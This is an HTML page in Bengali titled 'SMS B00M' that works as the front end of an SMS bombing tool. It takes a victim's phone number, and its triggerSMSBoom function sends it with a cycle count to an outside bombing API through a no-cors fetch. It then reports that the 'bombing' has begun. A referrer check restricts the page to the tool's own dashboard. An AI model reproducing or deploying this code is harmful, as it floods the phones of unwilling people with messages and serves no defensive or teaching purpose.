<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>SMS B00M | SPECIAL CELL</title>
  <style>
    /* ১. বডি ও থিম */
    body {
      margin: 0;
      padding: 0;
      min-height: 100vh;
      background: radial-gradient(circle at top, #00111a 0%, #000000 100%);
      font-family: "Poppins", sans-serif;
      color: #00eaff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
    }
    .boom-container {
      margin-top: -50px;
      display: flex;
      flex-direction: column;
      gap: 20px;
      width: 90%;
      max-width: 400px;
      padding: 40px 20px;
      border-radius: 15px;
      background: #001820;
      box-shadow: 0 0 25px #00eaff88;
    }
    h1 {
      font-size: 24px;
      font-weight: bold;
      text-shadow: 0 0 15px #00eaff, 0 0 25px #00eaff;
      margin-bottom: 5px;
    }
    
    /* ২. ইনপুট ও বাটন স্টাইল */
    input[type="number"] {
      padding: 15px;
      border-radius: 8px;
      border: 2px solid #00eaff;
      background: #000a10;
      color: #00eaff;
      font-size: 18px;
      text-align: center;
      box-shadow: 0 0 10px #00eaff88;
      outline: none;
      transition: border-color 0.3s;
    }
    .btn {
      padding: 15px;
      border-radius: 12px;
      background: #002a33;
      color: #00eaff;
      font-size: 20px;
      font-weight: bold;
      border: none;
      cursor: pointer;
      text-shadow: 0 0 10px #00eaff;
      box-shadow: 0 0 20px #00eaffaa;
      transition: 0.3s;
    }
    .btn:hover {
      transform: scale(1.03);
      background: #004455;
    }
    
    /* ৩. ড্যাশবোর্ড বাটন স্টাইল */
    .dashboard-link-btn {
        padding: 15px;
        border-radius: 12px;
        background: #330044;
        color: #ff00ff;
        font-size: 18px;
        font-weight: bold;
        border: none;
        cursor: pointer;
        text-shadow: 0 0 8px #ff00ff;
        box-shadow: 0 0 15px #ff00ff88;
        text-decoration: none;
        display: block;
        text-align: center;
        transition: 0.3s;
    }
    .dashboard-link-btn:hover {
        transform: scale(1.03);
        background: #550066;
    }
    
    /* ৪. স্ট্যাটাস মেসেজ স্টাইল */
    #status {
      margin-top: 5px;
      font-size: 16px;
      min-height: 20px;
      color: #00ffaa;
      text-shadow: 0 0 8px #00ffaa;
    }
  </style>

  <script>
    (function() {
      const referrer = document.referrer;
      const allowedReferrers = ['dashboard.html', 'special_dashboard.html']; 

      let isAllowed = false;
      for (const allowed of allowedReferrers) {
          if (referrer.includes(allowed)) {
              isAllowed = true;
              break;
          }
      }

      if (!isAllowed) {
          window.location.replace('index.html');
      }
    })();
  </script>
</head>
<body>

  <div class="boom-container">
    
    <h1>আপনার কলিজার নম্বর দেন</h1>
    
    <input 
      type="number" 
      id="targetNumber" 
      placeholder="017********" 
      pattern="[0-9]*" 
      inputmode="numeric" 
      maxlength="11"
      required
    />
    
    <button class="btn" onclick="triggerSMSBoom()">গুতা দেন</button>

    <div id="status"></div>

    <a href="special_dashboard.html" class="dashboard-link-btn">ড্যাশবোর্ড</a>
  </div>

  <script>
    function triggerSMSBoom() {
        const numberInput = document.getElementById('targetNumber');
        const statusDiv = document.getElementById('status');
        const number = numberInput.value.trim();
        
        // ১. ইনপুট ভ্যালিডেশন
        if (!number || number.length < 10) {
            statusDiv.textContent = 'দয়া করে সঠিক নম্বর দিন!';
            statusDiv.style.color = '#ff0055'; 
            statusDiv.style.textShadow = '0 0 8px #ff0055';
            return;
        }

        // ২. API URL: আপনার নতুন API এখানে প্রতিস্থাপন করুন
        // NOTE: যেহেতু পুরোনো API কাজ করছে না, এটি একটি প্লেসহোল্ডার।
        const apiUrl = `http://mahfuz-boom.gt.tc/?number=${number}&cycles=3`;
        
        // স্ট্যাটাস আপডেট
        statusDiv.textContent = 'SMS B00M শুরু হচ্ছে...';
        statusDiv.style.color = '#00eaff';
        statusDiv.style.textShadow = '0 0 8px #00eaff';

        // ৩. Fetch API ব্যবহার করে কল (GET অনুরোধ)
        // 'no-cors' মোড ব্যবহার করা হচ্ছে যাতে ব্রাউজার CORS ত্রুটি দেখালেও কলটি অন্তত শুরু করে
        fetch(apiUrl, { mode: 'no-cors' })
            .then(response => {
                // 'no-cors' মোডে রেসপন্সটি সাধারণত স্বচ্ছ (opaque) হয়, 
                // তাই এটি কেবল নির্দেশ করে যে কলটি সফলভাবে সার্ভারে পাঠানো হয়েছে।
                statusDiv.textContent = `সফল! বোমবিং শুরু হয়েছে।`;
                statusDiv.style.color = '#00ffaa'; 
                statusDiv.style.textShadow = '0 0 8px #00ffaa';
            })
            .catch(error => {
                // নেটওয়ার্ক বা অন্যান্য সমস্যা হলে
                console.error("API কল ত্রুটি:", error);
                
                // যদি no-cors মোডও ব্যর্থ হয় (যেমন সার্ভার ডাউন), তবে একটি স্পষ্ট বার্তা দেখানো
                statusDiv.textContent = `ত্রুটি: API সার্ভারের সাথে সংযোগ স্থাপন করা যাচ্ছে না।`;
                statusDiv.style.color = '#ff0055'; 
                statusDiv.style.textShadow = '0 0 8px #ff0055';
            });
    }
  </script>
</body>
</html>
